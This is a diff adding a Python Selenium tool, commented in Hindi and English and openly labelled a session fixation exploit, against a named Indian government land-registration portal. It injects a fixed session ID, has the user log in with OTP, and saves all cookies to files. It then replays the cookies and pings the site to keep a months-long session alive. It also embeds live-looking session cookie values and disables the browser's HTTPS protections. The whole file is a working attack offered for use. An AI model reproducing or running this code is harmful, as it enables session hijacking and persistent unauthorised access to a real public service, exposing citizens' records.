@@ -1,0 +1,413 @@
+import pickle
+import time
+import threading
+import requests
+import json
+import os
+from selenium import webdriver
+from selenium.webdriver.firefox.service import Service
+from selenium.webdriver.firefox.options import Options as FirefoxOptions
+from selenium.webdriver.firefox.firefox_profile import FirefoxProfile
+from webdriver_manager.firefox import GeckoDriverManager
+
+# ============================================================
+# 🔥 CONFIGURATION
+# ============================================================
+LOGIN_URL = "https://jharnibandhan.gov.in/Citizenentry/citizenlogin"
+DASHBOARD_URL = "https://jharnibandhan.gov.in/Citizenentry/welcome"
+ROOT_URL = "https://jharnibandhan.gov.in/"
+
+PROFILE_PATH = r"C:\Users\admin\AppData\Roaming\Mozilla\Firefox\Profiles\tz38mt81.default-release"
+FIXED_SESSION_ID = "MYSUPERSESSION123456"
+SESSION_FILE = "six_month_session.pkl"
+JSON_COOKIE_FILE = "cookies.json"  # यहाँ से JSON Load होगा
+KEEP_ALIVE_INTERVAL = 300
+
+# ============================================================
+# 🔥 EMBEDDED COOKIES JSON (EditThisCookie से Export की हुई)
+# ============================================================
+COOKIES_JSON = """
+[
+    {
+        "name": "PHPSESSID",
+        "value": "MYSUPERSESSION123456",
+        "domain": ".jharnibandhan.gov.in",
+        "hostOnly": false,
+        "path": "/",
+        "secure": true,
+        "httpOnly": false,
+        "sameSite": "no_restriction",
+        "session": false,
+        "firstPartyDomain": "",
+        "partitionKey": null,
+        "expirationDate": 1804569214,
+        "storeId": null
+    },
+    {
+        "name": "NGDRSU[userid]",
+        "value": "Q2FrZQ%3D%3D.sbcfBGBg",
+        "domain": "jharnibandhan.gov.in",
+        "hostOnly": true,
+        "path": "/",
+        "secure": true,
+        "httpOnly": true,
+        "sameSite": "no_restriction",
+        "session": true,
+        "firstPartyDomain": "",
+        "partitionKey": null,
+        "storeId": null
+    },
+    {
+        "name": "NGDRS",
+        "value": "kg7knn0hogao756qo9jo2i6fq5",
+        "domain": "jharnibandhan.gov.in",
+        "hostOnly": true,
+        "path": "/",
+        "secure": true,
+        "httpOnly": true,
+        "sameSite": "no_restriction",
+        "session": false,
+        "firstPartyDomain": "",
+        "partitionKey": null,
+        "expirationDate": 1788792036.115,
+        "storeId": null
+    }
+]
+"""
+
+# ============================================================
+# 🔥 HELPER: Clean Cookie (Selenium के लिए)
+# ============================================================
+def prepare_cookie(cookie):
+    clean = {
+        'name': cookie['name'],
+        'value': cookie['value'],
+        'domain': cookie.get('domain', 'jharnibandhan.gov.in'),
+        'path': cookie.get('path', '/'),
+        'secure': cookie.get('secure', True),
+        'httpOnly': cookie.get('httpOnly', True),
+        'sameSite': cookie.get('sameSite', 'Lax')
+    }
+    # Expiry को int में बदलो
+    if 'expirationDate' in cookie:
+        clean['expiry'] = int(cookie['expirationDate'])
+    elif 'expiry' in cookie:
+        clean['expiry'] = int(cookie['expiry'])
+    else:
+        clean['expiry'] = int(time.time()) + 15778463  # 6 महीने
+    return clean
+
+# ============================================================
+# 🔥 KEEP-ALIVE THREAD
+# ============================================================
+def keep_alive(driver):
+    while True:
+        time.sleep(KEEP_ALIVE_INTERVAL)
+        try:
+            driver.get(DASHBOARD_URL)
+            print("🔄 Keep-Alive: Session Alive!")
+        except Exception as e:
+            print(f"⚠️ Keep-Alive Error: {e}")
+            break
+
+# ============================================================
+# 🔥 BROWSER SETUP
+# ============================================================
+def get_driver():
+    options = FirefoxOptions()
+    options.set_preference("security.mixed_content.block_active_content", False)
+    options.set_preference("security.mixed_content.block_display_content", False)
+    options.set_preference("dom.security.https_only_mode", False)
+    options.set_preference("dom.security.https_only_mode_ever_enabled", False)
+    
+    try:
+        if os.path.exists(PROFILE_PATH):
+            profile = FirefoxProfile(PROFILE_PATH)
+            options.profile = profile
+            print("✅ Profile Loaded Successfully.")
+        else:
+            print("⚠️ Profile Path नहीं मिला, Default Profile Use होगा।")
+    except Exception as e:
+        print(f"⚠️ Profile Load Error: {e}")
+    
+    service = Service(GeckoDriverManager().install())
+    driver = webdriver.Firefox(service=service, options=options)
+    driver.maximize_window()
+    return driver
+
+# ============================================================
+# 🔥 EXPLOIT – Session Fixation (Option 1)
+# ============================================================
+def exploit_session_fixation():
+    print("\n🔥🔥🔥 SESSION FIXATION EXPLOIT – 6 MONTH ACCESS 🔥🔥🔥")
+    print("=" * 60)
+    
+    driver = get_driver()
+    
+    driver.get(LOGIN_URL)
+    time.sleep(2)
+    
+    print(f"\n🔑 Injecting Fixed Session ID: {FIXED_SESSION_ID}")
+    driver.execute_script(f"""
+        document.cookie = 'PHPSESSID={FIXED_SESSION_ID}; path=/; domain=.jharnibandhan.gov.in';
+        document.cookie = 'PHPSESSID={FIXED_SESSION_ID}; path=/';
+    """)
+    print("   ✅ Session ID Injected!")
+    
+    driver.get(LOGIN_URL)
+    time.sleep(2)
+    
+    found = False
+    for c in driver.get_cookies():
+        if 'PHPSESSID' in c['name'] and c['value'] == FIXED_SESSION_ID:
+            print("   ✅ Verification PASSED!")
+            found = True
+            break
+    if not found:
+        print("   ⚠️ Verification FAILED")
+    
+    print("\n⏳ अब मैन्युअल Login करो (OTP + CAPTCHA)")
+    print(f"👉 Session ID already set to: {FIXED_SESSION_ID}")
+    input("Press Enter after successful login...")
+    
+    time.sleep(5)
+    
+    driver.get(DASHBOARD_URL)
+    time.sleep(3)
+    
+    if "citizenlogin" in driver.current_url:
+        print("❌ Login failed!")
+        driver.quit()
+        return
+    
+    print("\n🎉 LOGIN SUCCESSFUL!")
+    
+    # 🔥 सारी Cookies निकालो और JSON फाइल में सेव करो
+    all_cookies = driver.get_cookies()
+    with open(JSON_COOKIE_FILE, "w") as f:
+        json.dump(all_cookies, f, indent=4)
+    print(f"   ✅ All cookies saved to {JSON_COOKIE_FILE}")
+    
+    # PHPSESSID को अलग से सेव करो (पुरानी फाइल)
+    session_cookie = None
+    for c in all_cookies:
+        if 'PHPSESSID' in c['name']:
+            session_cookie = c
+            break
+    
+    if session_cookie:
+        clean_cookie = prepare_cookie(session_cookie)
+        print(f"\n✅ Clean Cookie Ready:")
+        print(f"   Name: {clean_cookie['name']}")
+        print(f"   Expiry: {time.ctime(clean_cookie['expiry'])}")
+        
+        with open(SESSION_FILE, "wb") as f:
+            pickle.dump(clean_cookie, f)
+        print(f"   💾 Session saved to {SESSION_FILE}")
+    
+    print("\n🔄 Starting Keep-Alive...")
+    thread = threading.Thread(target=keep_alive, args=(driver,), daemon=True)
+    thread.start()
+    
+    print("\n" + "=" * 60)
+    print("🔥🔥🔥 6-MONTH ACCESS ACHIEVED! 🔥🔥🔥")
+    print("=" * 60)
+    input("\nPress Enter to close browser....")
+    driver.quit()
+
+# ============================================================
+# 🚀 AUTO-LOGIN USING JSON COOKIES (Option 2 - NEW)
+# ============================================================
+def auto_login_with_json():
+    print("\n🚀 AUTO-LOGIN USING JSON COOKIES...")
+    
+    # JSON Load करो (Embedded या File से)
+    try:
+        if os.path.exists(JSON_COOKIE_FILE):
+            with open(JSON_COOKIE_FILE, "r") as f:
+                cookies = json.load(f)
+            print(f"✅ Loaded {len(cookies)} cookies from {JSON_COOKIE_FILE}")
+        else:
+            # Embedded JSON Use करो
+            cookies = json.loads(COOKIES_JSON)
+            print(f"✅ Loaded {len(cookies)} cookies from embedded JSON")
+    except Exception as e:
+        print(f"❌ Error loading JSON: {e}")
+        return
+    
+    driver = get_driver()
+    
+    # Login Page पर जाओ
+    driver.get(LOGIN_URL)
+    time.sleep(2)
+    driver.delete_all_cookies()
+    print("🗑️ Old cookies cleared.")
+    
+    # सारी Cookies Inject करो
+    for cookie in cookies:
+        try:
+            clean = prepare_cookie(cookie)
+            driver.add_cookie(clean)
+            print(f"   ✅ Cookie Added: {clean['name']}")
+        except Exception as e:
+            print(f"   ⚠️ Failed: {cookie['name']} – {e}")
+    
+    # Dashboard पर Navigate करो
+    print("\n🔄 Navigating to Dashboard...")
+    driver.get(DASHBOARD_URL)
+    time.sleep(3)
+    
+    # अगर Login Page पर आ गया, तो Root Domain पर जाकर Check करो
+    if "citizenlogin" in driver.current_url:
+        print("🔄 Trying Root Domain...")
+        driver.get(ROOT_URL)
+        time.sleep(3)
+        if driver.current_url == ROOT_URL:
+            driver.get(DASHBOARD_URL)
+            time.sleep(3)
+    
+    if "citizenlogin" in driver.current_url:
+        print("❌ Session expired! Cookies काम नहीं कर रहीं।")
+        print("💡 हो सकता है कि Session Expire हो गया हो – Option 1 से Fresh Exploit चलाओ।")
+        driver.quit()
+        return
+    
+    print("\n🎉 AUTO-LOGIN SUCCESSFUL! 6-month session active!")
+    print(f"📍 Current URL: {driver.current_url}")
+    
+    # Keep-Alive Start
+    def keep_alive(driver):
+        while True:
+            time.sleep(KEEP_ALIVE_INTERVAL)
+            try:
+                driver.get(DASHBOARD_URL)
+                print("🔄 Keep-Alive: Session Extended!")
+            except:
+                break
+    
+    thread = threading.Thread(target=keep_alive, args=(driver,), daemon=True)
+    thread.start()
+    print("🔄 Keep-Alive Started (every 5 minutes)")
+    
+    input("\nPress Enter to close browser...")
+    driver.quit()
+
+# ============================================================
+# 🚀 AUTO-LOGIN USING OLD SESSION FILE (Option 3 - पुराना)
+# ============================================================
+def auto_login_6months():
+    print("\n🚀 AUTO-LOGIN USING SESSION FILE...")
+    
+    try:
+        with open(SESSION_FILE, "rb") as f:
+            session_cookie = pickle.load(f)
+    except FileNotFoundError:
+        print("❌ No session file found! Run Option 1 first.")
+        return
+    
+    driver = get_driver()
+    clean_cookie = prepare_cookie(session_cookie)
+    
+    driver.get(LOGIN_URL)
+    time.sleep(2)
+    driver.delete_all_cookies()
+    driver.add_cookie(clean_cookie)
+    print(f"✅ Session Cookie Injected: {clean_cookie['name']}")
+    
+    time.sleep(2)
+    driver.get(ROOT_URL)
+    time.sleep(3)
+    
+    if driver.current_url == ROOT_URL or driver.current_url == "https://jharnibandhan.gov.in":
+        print("🔄 Redirecting to Dashboard...")
+        driver.get(DASHBOARD_URL)
+        time.sleep(3)
+    
+    if "citizenlogin" in driver.current_url:
+        print("❌ Session expired! Run Option 1 again.")
+        driver.quit()
+        return
+    
+    print("🎉 Auto-Login Successful!")
+    
+    def keep_alive(driver):
+        while True:
+            time.sleep(KEEP_ALIVE_INTERVAL)
+            try:
+                driver.get(DASHBOARD_URL)
+                print("🔄 Keep-Alive: Session Extended!")
+            except:
+                break
+    
+    thread = threading.Thread(target=keep_alive, args=(driver,), daemon=True)
+    thread.start()
+    print("🔄 Keep-Alive Started")
+    
+    input("\nPress Enter to close browser...")
+    driver.quit()
+
+# ============================================================
+# 📊 STATUS CHECK
+# ============================================================
+def status_check():
+    print("\n📊 STATUS CHECK")
+    
+    # Check JSON file
+    try:
+        if os.path.exists(JSON_COOKIE_FILE):
+            with open(JSON_COOKIE_FILE, "r") as f:
+                cookies = json.load(f)
+            phpsessid = None
+            for c in cookies:
+                if c['name'] == 'PHPSESSID':
+                    phpsessid = c
+                    break
+            if phpsessid and 'expirationDate' in phpsessid:
+                remaining = (phpsessid['expirationDate'] - time.time()) / (60 * 60 * 24)
+                if remaining > 0:
+                    print(f"✅ JSON Cookie Session VALID – {remaining:.0f} days remaining")
+                else:
+                    print("⚠️ JSON Cookie Session EXPIRED")
+            else:
+                print("ℹ️ PHPSESSID not found in JSON")
+        else:
+            print("❌ No cookies.json file found.")
+    except Exception as e:
+        print(f"⚠️ Error reading JSON: {e}")
+    
+    # Check old session file
+    try:
+        with open(SESSION_FILE, "rb") as f:
+            session = pickle.load(f)
+        remaining = (session.get('expiry', 0) - time.time()) / (60 * 60 * 24)
+        if remaining > 0:
+            print(f"✅ Session File Valid – {remaining:.0f} days remaining")
+        else:
+            print("⚠️ Session File EXPIRED")
+    except:
+        print("❌ No session file found.")
+
+# ============================================================
+# 📋 MENU
+# ============================================================
+if __name__ == "__main__":
+    print("\n🔥 SESSION FIXATION EXPLOIT – 6 MONTH ACCESS (JSON READY)")
+    print("1️⃣  Run Exploit (OTP Required ONCE) – Creates cookies.json")
+    print("2️⃣  Auto-Login using JSON Cookies (New)")
+    print("3️⃣  Auto-Login using Session File (Old)")
+    print("4️⃣  Status Check")
+    print("5️⃣  Exit")
+    choice = input("\n👉 Select (1/2/3/4/5): ")
+    
+    if choice == "1":
+        exploit_session_fixation()
+    elif choice == "2":
+        auto_login_with_json()
+    elif choice == "3":
+        auto_login_6months()
+    elif choice == "4":
+        status_check()
+    elif choice == "5":
+        print("👋 बाय!")
+    else:
+        print("❌ Invalid choice.")
